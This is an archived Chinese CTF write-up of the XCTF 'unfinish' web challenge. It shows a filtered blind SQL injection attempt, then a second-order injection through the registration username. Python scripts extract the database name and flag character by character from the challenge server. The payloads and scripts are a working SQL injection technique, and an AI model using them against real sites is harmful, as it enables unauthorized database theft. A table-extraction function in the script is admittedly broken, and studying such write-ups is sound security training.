<!--yml
category: 未分类
date: 2022-04-26 14:51:58
-->

# 攻防世界-web-unfinish-从0到1的解题历程writeup_CTF小白的博客-CSDN博客

> 来源：[https://blog.csdn.net/qq_41429081/article/details/105600568](https://blog.csdn.net/qq_41429081/article/details/105600568)

## 题目分析

题目描述为：SQL

题目主要功能界面分析：

主要分为注册、登陆、以及成功登陆后的一个界面。

通过描述可以知道题目应该存在SQL注入漏洞。

![图片](img/3f7a0b4f816b32c7b7a3223c539ee19f.png)

扫描得知注册界面存在SQL注入漏洞

尝试构造sql盲注语句如下

```
{'username': "1' and ELT(left((SELECT schema_name FROM information_schema.schemata limit 0,1),1)='d',SLEEP(5)) or '1'='1", 'password': 'admin', 'email': 'eamil@eamil.com'} 
```

得到结果为

![图片](img/948a8c89df4dd753ae87b54a1037cc31.png)

即存在过滤

测试发现过滤了逗号、information

那么使用盲注应该不太行了，但是username这边的内容是可以执行，所以我们将username的值拼接上查找出来的内容，利用登陆后会显示用户名做到一个二次注入的效果。

## 解题流程

首先可知注册的sql语句应该为

```
insert into tables values('$email','$username','$password') 
```

我们通过控制post的参数

构造sql语句为：

```
insert into tables values('admin1@admin.com','0'+ascii(substr((select database()) from 1 for 1))+'0','admin') 
```

即插入的username即拼接上了我们要查找的

查数据库脚本如下

```
import requests
import time
from bs4 import BeautifulSoup       

def getDatabase():
    database = ''
    for i in range(10):
        data_database = {
            'username':"0'+ascii(substr((select database()) from "+str(i+1)+" for 1))+'0",
            'password':'admin',
            "email":"admin11@admin.com"+str(i)
        }

        requests.post("http://159.138.137.79:52974/register.php",data_database)
        login_data={
            'password':'admin',
            "email":"admin11@admin.com"+str(i)
        }
        response=requests.post("http://159.138.137.79:52974/login.php",login_data)
        html=response.text                  
        soup=BeautifulSoup(html,'html.parser')
        getUsername=soup.find_all('span')[0]
        username=getUsername.text
        if int(username)==0:
            break
        database+=chr(int(username))
    return database

print(getDatabase()) 
```

得到数据库名为web

然后尝试获取表名失败，因为过滤了information

看了评论说表名全靠猜哈哈

![图片](img/af517b1c9195efb6c05f6b80d6675831.png)

还是给上一个获取flag的脚本

脚本中途获取表名失败了，被我注释了~~emmm

```
import requests
import time
from bs4 import BeautifulSoup       

def getDatabase():
    database = ''
    for i in range(10):
        data_database = {
            'username':"0'+ascii(substr((select database()) from "+str(i+1)+" for 1))+'0",
            'password':'admin',
            "email":"admin11@admin.com"+str(i)
        }

        requests.post("http://159.138.137.79:52974/register.php",data_database)
        login_data={
            'password':'admin',
            "email":"admin11@admin.com"+str(i)
        }
        response=requests.post("http://159.138.137.79:52974/login.php",login_data)
        html=response.text                  
        soup=BeautifulSoup(html,'html.parser')
        getUsername=soup.find_all('span')[0]
        username=getUsername.text
        if int(username)==0:
            break
        database+=chr(int(username))
    return database

print(getDatabase())

def getTables():
    tables = ''
    for i in range(10):
        data_tables = {
            'username':"0'+ascii(substr((select tables()) from "+str(i+1)+" for 1))+'0",
            'password':'admin',
            "email":"admin12@admin.com"+str(i)
        }

        requests.post("http://159.138.137.79:52974/register.php",data_tables)
        login_data={
            'password':'admin',
            "email":"admin12@admin.com"+str(i)
        }
        response=requests.post("http://159.138.137.79:52974/login.php",login_data)
        html=response.text                  
        soup=BeautifulSoup(html,'html.parser')
        getUsername=soup.find_all('span')[0]
        username=getUsername.text
        if int(username)==0:
            break
        tables+=chr(int(username))
    return tables
'''
print(getTables())
'''

def getFlag():
    flag = ''
    for i in range(40):
        data_flag = {
            'username':"0'+ascii(substr((select * from flag) from "+str(i+1)+" for 1))+'0",
            'password':'admin',
            "email":"admin32@admin.com"+str(i)
        }

        requests.post("http://159.138.137.79:52974/register.php",data_flag)
        login_data={
            'password':'admin',
            "email":"admin32@admin.com"+str(i)
        }
        response=requests.post("http://159.138.137.79:52974/login.php",login_data)
        html=response.text                  
        soup=BeautifulSoup(html,'html.parser')
        getUsername=soup.find_all('span')[0]
        username=getUsername.text
        if int(username)==0:
            break
        flag+=chr(int(username))
    return flag

print(getFlag()) 
```

![图片](img/1d0bfc4e8759f4c9f046a0857dd72271.png)